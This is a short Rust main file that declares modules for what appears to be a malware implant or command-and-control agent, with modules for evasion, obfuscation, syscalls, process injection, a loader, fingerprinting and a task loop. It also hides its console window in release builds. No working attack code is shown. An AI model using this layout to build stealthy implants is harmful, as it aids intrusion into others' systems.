#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod obfs;
mod task;
mod syscall;
mod inject;
mod loader;
mod fingerprint;
mod agent_loop;

pub use agent_loop::Session;

fn main() {
    agent_loop::run();
}
